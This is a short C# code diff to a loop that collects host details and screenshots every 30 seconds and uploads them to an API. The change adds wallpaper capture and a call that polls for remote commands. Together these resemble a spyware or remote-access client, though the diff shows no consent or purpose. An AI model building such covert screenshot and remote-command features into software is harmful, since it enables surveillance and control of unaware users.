@@ -22,6 +22,7 @@ public class Program
         {
             try
             {
+                
                 var monitoredData = new
                 {
                     // Monitored data properties
@@ -32,25 +33,27 @@ public class Program
                     timeZone = TimeZoneInfo.Local.DisplayName,
                     batteryPercentage = BatteryInfo.GetBatteryPercentage(),
                     isBatteryPluggedIn = BatteryInfo.IsPluggedIn(),
-                    isConnectedToInternet = new WebClient().DownloadString("http://www.google.com") != null, // Bad way to check but it works
+                    isConnectedToInternet = new WebClient().DownloadString("http://www.google.com") != null,
                     processorModel = Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER"),
                     processorArchitecture = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE"),
                     processorCount = Environment.ProcessorCount,
                     logicalDrivesAvailable = Environment.GetLogicalDrives(),
                     osVersion = Environment.OSVersion.VersionString,
-                    is64BitOS = Environment.Is64BitOperatingSystem,
+                    is64BitOS = Environment.Is64BitOperatingSystem, 
                     ramUsage = Process.GetCurrentProcess().PrivateMemorySize64,
-                    timeOfMonitoring = DateTime.Now.ToString("HH:mm:ss - dd/MM/yyyy"),
+                    timeOfMonitoring = DateTime.Now.ToString("HH:mm:ss - MM/dd/yyyy"),
                 };
-                await APIHandler.SendMonitoredDataAsync(monitoredData, ScreenshotCapture.GetScreenshotPath());
+                await APIHandler.SendMonitoredDataAsync(monitoredData, ScreenshotCapture.GetScreenshotPath(), ScreenshotCapture.GetCurrentWallpaper());
             }
             catch (Exception ex)
             {
                 Console.WriteLine($"Error: {ex.Message}");
             }
             Thread.Sleep(30000);
+            await APIHandler.checkforRemoteCommands();
+
         }
-        
+
     }
 
     public static string GetLocalIPAddress()
